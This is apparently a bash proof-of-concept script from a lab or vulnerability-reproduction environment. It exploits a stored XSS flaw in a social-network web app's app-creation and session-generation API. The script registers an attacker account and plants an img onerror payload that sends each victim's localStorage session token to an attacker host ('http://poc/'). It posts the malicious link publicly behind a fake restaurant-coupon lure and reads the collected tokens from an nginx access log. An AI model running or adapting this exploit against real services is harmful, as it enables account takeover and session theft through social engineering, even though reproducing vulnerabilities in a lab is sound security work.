#!/bin/bash
log(){
    if [ "${REPORT_MODE}" = "yes" ]; then
        # TODO report
        :
    else
        echo "[PoC-INFO] $1"
    fi
}

# wait app up
sleep 60

# Register attack first
i=$(curl -LSs -X $'POST' --data-binary $'{\"username\":\"attack\",\"password\":\"dxy0411\",\"invitationCode\":\"\",\"g-recaptcha-response\":null}' $'http://web:3000/api/signup' | jq -r .token)
log "register user success. username=attack i=${i}"

send_link(){
    log "generate app with xss payload..."
    app_secret=$(curl -LSs "http://web:3000/api/app/create" \
    -d '{"name":"<img src=x onerror=location.replace(\"http://poc/\"+localStorage.getItem(\"i\"))>","description":" ","callbackUrl":"","permission":[]}' \
    | jq -r .secret)
    log "ok. appSecret=${app_secret}"

    log "generate evil link..."
    link=$(curl -LSs "http://web:3000/api/auth/session/generate" -d"{\"appSecret\":\"${app_secret}\",\"i\":\"${i}\"}" | jq -r .url)
    log "ok. link=${link}"

    log "post link..."
    result=$(curl -i -s -k -X $'POST' \
    --data-binary "{\"text\":\"#优惠分享 开学季到啦，海底捞洒落1折优惠券🥳，领取链接：http://web:3000${link}\",\"visibility\":\"public\",\"localOnly\":false,\"geo\":null,\"i\":\"${i}\"}" \
    $'http://web:3000/api/notes/create')
    if [[ "$result" =~ "HTTP/1.1 200 OK" ]]; then
        log "post success. waiting for someone's click..."
    else
        log "post fail"
    fi

    log "register a user for clicking malicious links..."
    i2=$(curl -LSs -X $'POST' \
    --data-binary $'{\"username\":\"dxy\",\"password\":\"dxy0411\",\"invitationCode\":\"\",\"g-recaptcha-response\":null}' \
    $'http://web:3000/api/signup' | jq -r .token)
    log "register user success. username=dxy i=${i2}"
}


nginx

send_link

sleep 100

echo 'poc-nginx log: '
cat /var/log/nginx/access.log

echo 'poc success!'
